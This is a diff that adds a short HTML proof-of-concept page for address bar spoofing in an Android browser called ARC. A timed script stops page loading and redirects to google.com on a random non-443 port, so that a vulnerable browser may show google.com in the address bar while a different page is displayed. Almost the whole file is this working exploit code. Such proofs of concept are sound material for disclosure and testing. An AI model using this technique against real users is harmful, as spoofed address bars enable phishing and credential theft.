@@ -1,0 +1,22 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>ARC Browser Address Bar Spoofing – Android Test</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<body>
+<h2>ARC Browser Address Bar Spoofing – Android PoC</h2>
+<p>If the browser is vulnerable, you may see <strong>google.com</strong> in the address bar while the actual page is on a non-443 port.</p>
+
+<script>
+(function spoof() {
+    setTimeout(() => {
+        try { window.stop(); } catch(e) {}
+        let randomPort;
+        do {
+            randomPort = Math.floor(Math.random() * 1000);
+        } while (randomPort === 0 || randomPort === 443);
+        // Directly to google.com with a random HTTPS port
+        document.location = "https://google.com:" + randomPort + "/";
+    }, 300); // tweak timing if needed (150–600ms range)
+})();
+</script>
+</body>
